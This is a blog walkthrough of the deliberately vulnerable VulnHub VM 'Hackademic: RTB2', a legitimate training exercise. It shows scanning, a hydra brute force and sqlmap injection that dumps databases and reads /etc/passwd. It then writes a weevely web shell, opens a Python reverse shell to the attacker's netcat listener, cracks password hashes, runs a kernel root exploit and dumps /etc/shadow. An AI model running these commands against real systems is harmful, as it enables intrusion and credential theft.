---
layout: post
title: "Hackademic: RTB2"
date: 2015-06-03 17:26:01 +0200
comments: true
categories: [vulnhub, hackademic]
---
Image: [Hackademic: RTB2](https://www.vulnhub.com/entry/hackademic-rtb2,18/)

We gained the IP address 192.168.80.150 for our testing target.

Nmap output:
{% codeblock %}
root@kali32:# nmap 192.168.80.150 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:55 CEST
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 65.57% done; ETC: 07:55 (0:00:01 remaining)
Nmap scan report for 192.168.80.150
Host is up (0.00039s latency).
Not shown: 65533 closed ports
PORT    STATE    SERVICE
80/tcp  open     http
666/tcp filtered doom
MAC Address: 00:0C:29:74:B5:21 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
{% endcodeblock %}

It seems that the port 666 is filtered by the firewall. After running nmap scan
several times, we found the port to be open.

{% codeblock %}
root@kali32:# nmap 192.168.80.150 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:55 CEST
Nmap scan report for 192.168.80.150
Host is up (0.00036s latency).
Not shown: 65533 closed ports
PORT    STATE    SERVICE
80/tcp  open     http
666/tcp filtered doom
MAC Address: 00:0C:29:74:B5:21 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds

root@kali32:~# nmap 192.168.80.150 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-01 07:56 CEST
Nmap scan report for 192.168.80.150
Host is up (0.00038s latency).
Not shown: 65533 closed ports
PORT    STATE SERVICE
80/tcp  open  http
666/tcp open  doom
MAC Address: 00:0C:29:74:B5:21 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
{% endcodeblock %}

Nikto output for port 80:
{% codeblock %}
root@kali32:~# nikto -h http://192.168.80.150/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.80.150
+ Target Hostname:    192.168.80.150
+ Target Port:        80
+ Start Time:         2015-04-30 10:15:26 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.14 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, inode: 413560, size: 5108, mtime: Tue Aug 28 12:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 7495 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2015-04-30 10:15:41 (GMT2) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endcodeblock %}

The web page suggests to look for SQLi, unfortunately we were not able to find
any here.

Trying hydra for bruteforce or joomscan (port 666) reveals us nothing new too.
{% codeblock %}
root@kali32:/tmp# hydra 192.168.80.150 http-form-post "/check.php:username=^USER^&password=^PASS^&Submit=Check%21:wrong credentials" -L /usr/share/ncrack/default.usr -P /usr/share/ncrack/default.pwd  -t 10 -w 30  -u -f 
root@kali32:/tmp# joomscan -u http://192.168.80.150:666/index.php -oh 
{% endcodeblock %}

After a little time, we found SQLi in Joomla and dumped the whole database:
{% codeblock %}
root@kali32:/tmp# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --dump-all
{% endcodeblock %}

Trying to crack MySQL hashes was without success.
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv 
Host,User,Password,ssl_type,Drop_priv,File_priv,Grant_priv,Super_priv,Alter_priv,ssl_cipher,Index_priv,Event_priv,Create_priv,max_updates,Reload_priv,Delete_priv,Insert_priv,x509_issuer,Select_priv,Update_priv,Execute_priv,Show_db_priv,x509_subject,Process_priv,Trigger_priv,Shutdown_priv,max_questions,Show_view_priv,References_priv,max_connections,Repl_slave_priv,Repl_client_priv,Create_user_priv,Create_view_priv,Lock_tables_priv,Alter_routine_priv,Create_routine_priv,max_user_connections,Create_tmp_table_priv
localhost,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
HackademicRTB2,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
127.0.0.1,root,*5D3C124406BF85494067182754131FF4DAB9C6C7,<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
localhost,debian-sys-maint,*F36E6519B0B1D62AA2D5346EFAD66D1CAF248996,<blank>,Y,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,Y,<blank>,Y,Y,Y,Y,<blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
localhost,phpmyadmin,*5D3C124406BF85494067182754131FF4DAB9C6C7,<blank>,N,N,N,N,N,<blank>,N,N,N,0,N,N,N,<blank>,N,N,N,N,<blank>,N,N,N,0,N,N,0,N,N,N,N,N,N,N,0,N

root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > hashes.csv
root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# john --format=mysql-sha1 hashes.csv
{% endcodeblock %}

We parse the Joomla usernames and passwords and crack using John:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv 
id,gid,name,email,block,params,username,usertype,password,sendEmail,activation,registerDate,lastvisitDate
62,25,Administrator,admin@hackademirtb2.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,Administrator,Super Administrator,08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl,1,<blank>,2011-01-17 19:31:21,2011-01-22 16:38:49
63,18,John Smith,JSmith@hackademicrtb.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,JSmith,Registered,992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF,0,<blank>,2011-01-22 10:17:30,2011-01-25 15:02:13
64,18,Billy Tallor,BTallor@hackademic.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,BTallor,Registered,abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy,0,<blank>,2011-01-22 10:18:06,0000-00-00 00:00:00

root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e 's/:/\$/' -e 's/,/:/'  
username:password
Administrator:08f43b7f40fb0d56f6a8fb0271ec4710$n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
JSmith:992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF
BTallor:abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy

root@kali32:/usr/share/dirb# john --list=subformats
Format = dynamic_0   type = dynamic_0: md5($p) (raw-md5)
Format = dynamic_1   type = dynamic_1: md5($p.$s) (joomla)
Format = dynamic_2   type = dynamic_2: md5(md5($p)) (e107)
...

root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e 's/:/\$/' -e 's/,/:/'  > /tmp/joomla.pass 

root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1
...
root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1 --show
JSmith:matrix
BTallor:victim
test:test

3 password hashes cracked, 1 left
{% endcodeblock %}

Because the SQLi statements are executed by database root user, we can read or store arbitrary file to the server.
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/passwd
root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/issue
{% endcodeblock %}

The target is Ubuntu 10.04, we can predict better the filenames in /etc:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/phpmyadmin/config.inc.php

{% endcodeblock %}

We generate and upload the weevely shell, then upgrade to python shell over netcat:
{% codeblock %}
root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-write=weevely.php --file-dest=/var/www/test1.php

root@kali32:/usr/share/exploitdb# nc -lp 1338

www-data@HackademicRTB2:/tmp $ python -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" 192.168.80.137 1338
www-data@HackademicRTB2:/tmp$ 
{% endcodeblock %}

The following credentials could be used to log in phpMyAdmin using root:
{% codeblock lang:php %}
www-data@HackademicRTB2:/var/www $ cat configuration.php
<?php
class JConfig {
/* Site Settings */
var $offline = '0';
var $offline_message = 'This site is down for maintenance.<br /> Please check back again soon.';
var $sitename = 'Hackademic.RTB2';
var $editor = 'tinymce';
var $list_limit = '20';
var $legacy = '0';
/* Debug Settings */
var $debug = '0';
var $debug_lang = '0';
/* Database Settings */
var $dbtype = 'mysql';
var $host = 'localhost';
var $user = 'root';
var $password = 'yUtJklM97W';
var $db = 'joomla';
var $dbprefix = 'jos_';
/* Server Settings */
var $live_site = '';
var $secret = 'iFzlVUCg9BBPoUDU';
var $gzip = '0';
var $error_reporting = '-1';
var $helpurl = 'http://help.joomla.org';
var $xmlrpc_server = '0';
var $ftp_host = '127.0.0.1';
var $ftp_port = '21';
var $ftp_user = '';
var $ftp_pass = '';
var $ftp_root = '';
var $ftp_enable = '0';
var $force_ssl = '0';
/* Locale Settings */
var $offset = '0';
var $offset_user = '0';
/* Mail Settings */
var $mailer = 'mail';
var $mailfrom = 'admin@hackademirtb2.com';
var $fromname = 'Hackademic.RTB2';
var $sendmail = '/usr/sbin/sendmail';
var $smtpauth = '0';
var $smtpsecure = 'none';
var $smtpport = '25';
var $smtpuser = '';
var $smtppass = '';
var $smtphost = 'localhost';
/* Cache Settings */
var $caching = '0';
var $cachetime = '15';
var $cache_handler = 'file';
/* Meta Settings */
var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system';
var $MetaKeys = 'joomla, Joomla';  
var $MetaTitle = '1';
var $MetaAuthor = '1';
/* SEO Settings */
var $sef           = '0';
var $sef_rewrite   = '0';
var $sef_suffix    = '0';
/* Feed Settings */
var $feed_limit   = 10;
var $feed_email   = 'author';
var $log_path = '/var/www/logs';
var $tmp_path = '/var/www/tmp';
/* Session Setting */
var $lifetime = '15';
var $session_handler = 'database'; 
}
?>
{% endcodeblock %}

We download the [Linux_Exploit_Suggester.pl](https://github.com/PenturaLabs/Linux_Exploit_Suggester) and use for finding an exploit for privilege escalation:

{% codeblock %}
www-data@HackademicRTB2:/tmp$ perl Linux_Exploit_Suggester.pl
perl Linux_Exploit_Suggester.pl

Kernel local: 2.6.32

Searching among 65 exploits...

Possible Exploits:
[+] american-sign-language
   CVE-2010-4347
   Source: http://www.securityfocus.com/bid/45408/
[+] can_bcm
   CVE-2010-2959
   Source: http://www.exploit-db.com/exploits/14814/
[+] half_nelson
   Alt: econet    CVE-2010-3848
   Source: http://www.exploit-db.com/exploits/6851
[+] half_nelson1
   Alt: econet    CVE-2010-3848
   Source: http://www.exploit-db.com/exploits/17787/
[+] half_nelson2
   Alt: econet    CVE-2010-3850
   Source: http://www.exploit-db.com/exploits/17787/
[+] half_nelson3
   Alt: econet    CVE-2010-4073
   Source: http://www.exploit-db.com/exploits/17787/
[+] msr
   CVE-2013-0268
   Source: http://www.exploit-db.com/exploits/27297/
[+] pktcdvd
   CVE-2010-3437
   Source: http://www.exploit-db.com/exploits/15150/
[+] ptrace_kmod2
   Alt: ia32syscall,robert_you_suck    CVE-2010-3301
   Source: http://www.exploit-db.com/exploits/15023/
[+] rawmodePTY
   CVE-2014-0196
   Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
[+] rds
   CVE-2010-3904
   Source: http://www.exploit-db.com/exploits/15285/
[+] reiserfs
   CVE-2010-1146
   Source: http://www.exploit-db.com/exploits/12130/
[+] video4linux
   CVE-2010-3081
   Source: http://www.exploit-db.com/exploits/15024/
{% endcodeblock %}


We root the server using:
{% codeblock %}
https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15285.c

[+] rds
   CVE-2010-3904
   Source: http://www.exploit-db.com/exploits/15285/
{% endcodeblock %}

{% codeblock %}
# cat /etc/shadow
cat /etc/shadow
root:$6$YB3puY.G$drg9.SqpJyPujoS82zbwdQtM7xgPpAJlDmdQaH8tu2ndUrmNwIx29lYazyhhsFKKF.yw6ScopFmMAh.t/qIZn0:14999:0:99999:7:::
daemon:*:14837:0:99999:7:::
bin:*:14837:0:99999:7:::
sys:*:14837:0:99999:7:::
sync:*:14837:0:99999:7:::
games:*:14837:0:99999:7:::
man:*:14837:0:99999:7:::
lp:*:14837:0:99999:7:::
mail:*:14837:0:99999:7:::
news:*:14837:0:99999:7:::
uucp:*:14837:0:99999:7:::
proxy:*:14837:0:99999:7:::
www-data:*:14837:0:99999:7:::
backup:*:14837:0:99999:7:::
list:*:14837:0:99999:7:::
irc:*:14837:0:99999:7:::
gnats:*:14837:0:99999:7:::
nobody:*:14837:0:99999:7:::
libuuid:!:14837:0:99999:7:::
syslog:*:14837:0:99999:7:::
messagebus:*:14837:0:99999:7:::
avahi-autoipd:*:14837:0:99999:7:::
avahi:*:14837:0:99999:7:::
couchdb:*:14837:0:99999:7:::
speech-dispatcher:!:14837:0:99999:7:::
usbmux:*:14837:0:99999:7:::
haldaemon:*:14837:0:99999:7:::
kernoops:*:14837:0:99999:7:::
pulse:*:14837:0:99999:7:::
rtkit:*:14837:0:99999:7:::
saned:*:14837:0:99999:7:::
hplip:*:14837:0:99999:7:::
gdm:*:14837:0:99999:7:::
p0wnbox:$6$AT8lMX0W$GPAZaGLMX0mi5EPFhx9wT5qJu9bxkIEfH.cmKX/j/O3QpRWXgBQ2WUAa.SIoFGdcfKrv.FtuBVn1UonfItMrw1:14999:0:99999:7:::
mysql:!:14991:0:99999:7:::

# pwd
pwd
/root
# ls -l 
ls -l 
total 40
drwxr-xr-x 2 root root  4096 Jan 17  2011 Desktop
-rwxr-xr-x 1 root root 33921 Jan 22  2011 Key.txt

# cat /etc/knockd.conf
cat /etc/knockd.conf
[options]
        UseSyslog

[openHTTPD]
        sequence    = 7000,8000,9000
        seq_timeout = 5
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
        tcpflags    = syn

[closeHTTPD]
        sequence    = 9000,8000,7000
        seq_timeout = 5
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
        tcpflags    = syn


# base64 -d /root/Key.txt > /var/www/key.png
base64 -d /root/Key.txt > /var/www/key.png
{% endcodeblock %}

We can check the flag [here](http://192.168.80.150:666/key.png). As we can see
from output above, there is port-knocking mechanism using sequences 7000,8000,9000. 

Finally we want to see the check.php source:
{% codeblock lang:php %}
# cat /var/www/welcome/check.php
cat /var/www/welcome/check.php
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<html>
<head>
<title>Hackademic.RTB2</title>
<center>
<br><br><br>
<body bgcolor="black">
<img src="hackademicrtb2.png">
<font color="green">
</head>
</form>
<body>
<h2>
<br>
<?php
$pass_answer = "' or 1=1--'";
$pass_answer_2 = "' OR 1=1--'";

if($_POST['password'] == $pass_answer or $_POST['password'] == $pass_answer_2){
        echo '<h2>';
        echo 'Ok, nice shot...';
        echo '<br>';
        echo '</h2>';
        echo '...but, you are looking in a wrong place bro! ;-)';
        echo '<br>';
        echo '<br>';
        echo '<font color="black">';
        echo '%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A';
        echo '</font color="black">';

}

else{   
        echo '<h2>';
        echo 'You are trying to login with wrong credentials!';
        echo '<br>';
        echo '</h2>';
        echo "Please try again...";
}
?>
{% endcodeblock %}

After decoding the hex characters and converting binary digits in ruby: 
{% codeblock %}
irb(main):017:0>  [0b00110001, 0b00110000, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110001, 0b00110000, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110001, 0b00110001, 0b00111010, 0b00110001, 0b00110000, 0b00110000, 0b00110001].map{|x|x.chr}.join
=> "1001:1101:1011:1001"
{% endcodeblock %}

So the SQLi test is validated using string compare operator and it's quite
non-realistic (and unfair) to have two statements with the different case, that
was the reason why we didn't found out this firstly.
